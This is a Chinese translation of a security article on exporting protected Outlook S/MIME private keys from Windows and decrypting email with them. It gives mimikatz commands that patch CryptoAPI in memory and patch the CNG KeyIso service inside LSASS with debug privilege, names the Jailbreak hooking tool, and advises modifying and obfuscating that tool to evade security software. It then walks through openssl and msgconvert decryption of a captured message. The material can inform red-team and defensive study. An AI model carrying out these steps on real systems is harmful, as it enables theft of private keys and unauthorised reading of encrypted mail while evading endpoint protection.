> 原文链接: https://www.anquanke.com//post/id/214257 


# Outlook私钥的导出与利用 - 解密S/MIME协议


                                阅读量   
                                **107694**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Guillaume Quéré，文章来源：errno.fr
                                <br>原文地址：[https://www.errno.fr/OutlookDecrypt/OutlookDecrypt](https://www.errno.fr/OutlookDecrypt/OutlookDecrypt)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t014a3344fafc01c4c7.png)](https://p1.ssl.qhimg.com/t014a3344fafc01c4c7.png)



## 1. 前言

Microsoft Outlook使用`[S/MIME协议](https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/s-mime-for-message-signing-and-encryption?view=o365-worldwide)`对邮件内容加密，该过程基于公钥加密。

对应的私钥(或相关证书)可以在Windows证书管理器中找到，CMD命令为`certmgr.msc`,如下：

[![](https://p4.ssl.qhimg.com/t01033b86d7cfbafe6a.png)](https://p4.ssl.qhimg.com/t01033b86d7cfbafe6a.png)

如上，这里并非所有证书都与内容加密有关，实际上我们只用关注第一个证书，因其包含用于解密接收内容的私钥。

根据一些安全策略，权限有限的用户不被允许直接导出其私钥。如下，私钥导出选项卡显示为灰色：

[![](https://p0.ssl.qhimg.com/t0164de2955964112f0.png)](https://p0.ssl.qhimg.com/t0164de2955964112f0.png)

尽管如此仍然有两个途径可以手动导出私钥，但是它们都会触发安全软件的默认防护策略，因此一般情况下我们不采取这些常规操作。



## 2. Windows加密接口

Windows中有两种加密接口：
<li>旧版：`CryptoAPI`
</li>
<li>对应的替代版：`Cryptographi API` 也被称为`CNG`<br>
从我已经了解到的情况来看，大多数应用程序仍然使用旧版的CryptoAPI，这使得私钥导出变得相对简单，我们将在后面进行演示。</li>
### <a class="reference-link" name="3.1.%20CryptoAPI"></a>2.1. CryptoAPI

`CryptoAPI`提供了一组函数。这些函数允许应用程序在对用户的敏感私钥数据提供保护时，以灵活的方式对数据进行加密或数字签名。实际的加密操作是由称为加密服务提供程序 (CSP) 的独立模块执行。查阅该组函数之一的`[CryptGenKey()函数](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptgenkey)`的官方手册。详情如下：

```
BOOL CryptGenKey(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  DWORD      dwFlags,
  HCRYPTKEY  *phKey
);
```

其第三参数`dwFlags`有关会话密钥的长度，可选值包含`CRYPT_EXPORTABLE`，其官方注释如下:

If this flag is set, then the key can be transferred out of the CSP into a key BLOB by using the CryptExportKey function. Because session keys generally must be exportable, this flag should usually be set when they are created. If this flag is not set, then the key is not exportable. For a session key, this means that the key is available only within the current session and only the application that created it will be able to use it. For a public/private key pair, this means that the private key cannot be transported or backed up.

（如果设置了此标志，则可以使用`CryptExportKey()`函数将密钥从[CSP(cryptographic service provider)](https://docs.microsoft.com/en-us/windows/desktop/SecGloss/c-gly)转移到Key Blob（一种密钥数据结构，CryptoAPI采用Key Blob数据结构存储离开了CSP内部的密钥）中时。因为会话密钥通常必须是被允许导出的，所以通常应在创建它们时设置此标志。如果未设置此标志，则密钥不可被导出。对于会话密钥，这意味着该密钥仅在当前会话中可用，并且只有创建它的应用程序才能使用它。在公钥/私钥对场景时，这意味着私钥不能被传输或备份。）

但是`CryptoAPI`毕竟只是一个基于用户空间的用于处理密钥的DLL，我们可以从调用过程入手控制其代码执行，这意味着我们可以对相关函数的实现过程进行修改。

在导出私钥时，`CryptExportKey()`函数执行流程如下：

[![](https://p0.ssl.qhimg.com/t014bc7112e56989ac3.png)](https://p0.ssl.qhimg.com/t014bc7112e56989ac3.png)

### <a class="reference-link" name="3.2.%20Cryptographi%20API%20(CNG)"></a>2.2. Cryptographi API (CNG)

从Windows2008开始，CNG中引入了一种密钥保护机制，以符合安全认证标准[`Common Criteria`](https://en.wikipedia.org/wiki/Common_Criteria)

现在，可以使用`Keyiso`(一个LSASS进程中托管的CNG密钥隔离服务)将密钥与使用它们的应用程序完全隔离，这意味着常规流程下任何对该服务的篡改都需要管理员权限.

在导出私钥时，`NCryptExportKey()`函数执行流程如下：

[![](https://p1.ssl.qhimg.com/t0193202653bd96fd48.png)](https://p1.ssl.qhimg.com/t0193202653bd96fd48.png)



## 3. 对应的绕过方法

### 3.1. 方法一：Mimikatz

#### 3.1.1. 修改CryptoAPI相关函数

对应受旧版`CryptoAPI`保护的密钥，不需要管理员权限运行mimikatz。

根据[mimikatz文档](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi)对应的加密模块具有专用的`capi`功能来取消私钥的保护功能，其注释如下：

This patch modifies a CryptoAPI function in the mimikatz process in order to make unexportable keys exportable (no specific rights other than access to the private key is needed)

该补丁程序修改了mimikatz进程中的若干CryptoAPI函数，以使不可导出的密钥可以导出（除了访问私钥外，不需要其他特定权限）

仅当密钥提供者为以下之一时，此功能有用：
- Microsoft Base Cryptographic Provider v1.0
- Microsoft Enhanced Cryptographic Provider v1.0
- Microsoft Enhanced RSA and AES Cryptographic Provider
- Microsoft RSA SChannel Cryptographic Provider
- Microsoft Strong Cryptographic Provider
让我们先尝试导出证书而不修改`CryptoAPI`相关函数，在mimikatz控制台输入如下命令尝试导出证书:

```
crypto::certificates /export
```

结果如下：

[![](https://p0.ssl.qhimg.com/t01aa7b67f4f87a90c8.png)](https://p0.ssl.qhimg.com/t01aa7b67f4f87a90c8.png)

截至目前，我们获得的所有证书都没有密钥，就像我们手动导出证书时证书管理器会发生的情况一样。

现在让我们在导出证书时之前先修改`CryptoAPI`相关函数，使用`crypto::capi`命令即可完成操作，如下:

[![](https://p1.ssl.qhimg.com/t01ea838d433c707081.png)](https://p1.ssl.qhimg.com/t01ea838d433c707081.png)

随后导出证书如下：

[![](https://p0.ssl.qhimg.com/t019f66a7a0df1707e4.png)](https://p0.ssl.qhimg.com/t019f66a7a0df1707e4.png)

很棒，我们现在额外得到了`PKCS12`加密标准的.pfx证书文件。进一步验证如下（默认导出密码为“ mimikatz”）：

```
openssl pkcs12 -in CURRENT_USER_My_0_xxxxxxxx.pfx -nocerts -nodes
Enter Import Password:
Bag Attributes
    localKeyID: 01 00 00 00
    Microsoft CSP Name: Microsoft Enhanced Cryptographic Provider v1.0
    friendlyName: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Key Attributes
    X509v3 Key Usage: 10
-----BEGIN PRIVATE KEY-----
You wouldn't download a private key?
-----END PRIVATE KEY-----

```

这个修改`CryptoAPI`的流程是怎样的？查看对应的[Mimikatz代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/crypto/kuhl_m_crypto_patch.c)可以发现，这是一个非常简单的内存补丁，原理基于以`JNE`指令来覆盖`JMP`指令:

```
BYTE PATC_WIN5_CPExportKey_EXPORT[]    = `{`0xeb`}`;
BYTE PATC_W6AL_CPExportKey_EXPORT[]    = `{`0x90, 0xe9`}`;
```

该恶意内存补丁貌似起到了不错的修改效果。

#### <a class="reference-link" name="4.1.2.%20%E4%BF%AE%E6%94%B9CNG%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"></a>3.1.2. 修改CNG相关函数

提取受CNG保护的私钥将需要管理员特权以修改`LSASS进程`（与上述原理相同，覆盖`JMP`指令绕过密钥导出时的安全检查），流程如下：

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::cng
"KeyIso" service patched

mimikatz # crypto::certificates /export
...
```

如果未执行`crypto::cng`命令进行CNG函数修改就执行`crypto::certificates /export`来导出证书，会抛出如下错误：

```
ERROR kull_m_patch_genericProcessOrServiceFromBuild ; OpenProcess (0x00000005)
```

根据错误信息，我们推测`LSASS进程`受某些安全软件保护，这一点可以通过mimikatz的`sekurlsa`命令集来判断。这里不作叙述。

如果在操作过程中出现如下错误：

```
ERROR kull_m_patch_genericProcessOrServiceFromBuild ; kull_m_patch (0x00000000)
```

这表明CNG相关函数无法被修改，原因可能是因为所使用的mimikatz版本不兼容当前系统，也可能是因为`LSASS进程`已被修改。

### <a class="reference-link" name="4.2.%20%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AJailbreak"></a>3.2. 方法二：Jailbreak

Jailbreak也是一款用于证书导出的工具,不过该方法仅适用于`CryptoAPI`的场景，但如果你没有好的思路来绕过安全软件的防护，则它可能比mimikatz方法更为简单，因为此软件易于编辑与混淆。该[项目](https://github.com/iSECPartners/jailbreak)包括未编译的二进制代码，虽然该项目已被多家安全厂商识别检测。但其代码可读性较强，可以做若干改动之后来实现绕过安全软件。

其原理是通过hook`CryptAPI`中的相关函数，让你正常使用证书管理器就像密钥或证书没有受到保护一样，软件成功如下：

[![](https://p2.ssl.qhimg.com/t01efa9f49d8f2f0015.png)](https://p2.ssl.qhimg.com/t01efa9f49d8f2f0015.png)



## 4. 用Thunderbird打开S/MIME加密文本

为了确保提取正确的密钥，我先在Linux上打开加密的邮件文本。

该`.msg`扩展名表明其为`MS-Outlook`格式，因此我们需要`msgconvert`指令在基于Debian的发行版中来进行消息转换，如下，我们搜索到了一个名为`libemail-outlook-message-perl`的转换工具：

```
apt-cache search msgconvert
libemail-outlook-message-perl - module for reading Outlook .msg files
```

安装好之后，我们可以将Outlook邮件的.msg格式转换为.eml格式：

```
msgconvert secret.msg
```

另外也可以通过Thunderbird(是Mozilla公司发布的一款开源邮件客户端)来轻松完成，我需要在Thunderbird中导入了.pfx密钥（配置菜单 » 证书 » 证书管理 » 你的证书 » 导入），如下:

[![](https://p4.ssl.qhimg.com/t0113203bfa35fbff0c.png)](https://p4.ssl.qhimg.com/t0113203bfa35fbff0c.png)

然后，只需打开EML文件即可，如下：

```
thunderbird secret.eml
```

这样我们可以在Linux上打开加密的消息，如下：

[![](https://p5.ssl.qhimg.com/t01b259d12de147b1ec.png)](https://p5.ssl.qhimg.com/t01b259d12de147b1ec.png)



## 5. 直接用openssl解密S/MIME协议

我们以`PKCS12`加密标准的Windows私钥(.pfx)开始，让我们将其转换为openssl可用的证书格式：

```
openssl pkcs12 -in CURRENT_USER_My_0_xxxxxxxx.pfx -nocerts -out example.key -nodes
Enter Import Password:

cat example.key
Bag Attributes
    localKeyID: 01 00 00 00
    Microsoft CSP Name: Microsoft Enhanced Cryptographic Provider v1.0
    friendlyName: xxxxxxxxx-MAIL-CHIFFREMENT-OUTLOOK-ac850079-6892-48f6-b327-2090ac4f565e
Key Attributes
    X509v3 Key Usage: 10
-----BEGIN PRIVATE KEY-----
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-----END PRIVATE KEY-----
```

类似于使用Thunderbird时的操作，我们需要将Outlook的 .msg文件转换为 .eml 文件：

```
msgconvert secret.msg
```

让我们只保留EML文件中P7M部分。该过程可以自动化实现，目前我只是在vim中删除了不相关的内容：

```
cat secret.p7m
Content-Type: application/pkcs7-mime; name="smime.p7m"
Content-Disposition: attachment; filename="smime.p7m"
Content-Transfer-Encoding: base64

MIAGCSqGSIb3DQEHA6CAMIACAQAxggLyMIIBdQIBADBdMFYxCzAJBgNVBAYTAkZSMQ8wDQYDVQQK
DAZFTkVESVMxFzAVBgNVBAsMDjAwMDIgNDQ0NjA4NDQyMR0wGwYDVQQDDBRBQyBNRVNTQUdFUklF
....
```

然后，我们可以解密EML中的P7M部分：

```
openssl smime -decrypt -in secret.p7m -inkey example.key
```

`openssl smime`命令集给我们提供了一个比实际消息大的多的base64格式 与 Blob 格式互相转换的渠道，因为解密后的若干内容仍然包含签名，但是如果我们只看一下前几个解码的字符，那就比较直观了，解密如下：

```
echo "MIAGCSqGSIb3DQEHAqCAMIACAQExCzAJBgUrDgMCGgUAMIAGCSqGSIb3DQEHAaCAJIAEggLWQ29udGVudC1UeXBlOiBtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7DQoJYm91bmRhcnk9Ii0tLS09X05leHRQYXJ0XzAwMF8wMDE1XzAxRDY2RkQ2LjUyQjVGN0YwIg0KDQpUaGlzIGlzIGEgbXVsdGlwYXJ0IG1lc3NhZ2UgaW4gTUlNRSBmb3JtYXQuDQoNCi0tLS0tLT1fTmV4dFBhcnRfMDAwXzAwMTVfMDFENjZGRDYuNTJCNUY3RjANCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbjsNCgljaGFyc2V0PSJpc28tODg1OS0xIg0KQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogOGJpdA0KDQpTdXBlciBzZWNyZXQgbWVzc2FnZSENCg0KDQoNCg0KDQoNCl" | base64 -d

Content-Type: multipart/alternative;
    boundary="----=_NextPart_000_0015_01D66FD6.52B5F7F0"

This is a multipart message in MIME format.

------=_NextPart_000_0015_01D66FD6.52B5F7F0
Content-Type: text/plain;
    charset="iso-8859-1"
Content-Transfer-Encoding: 8bit

Super secret message!
```
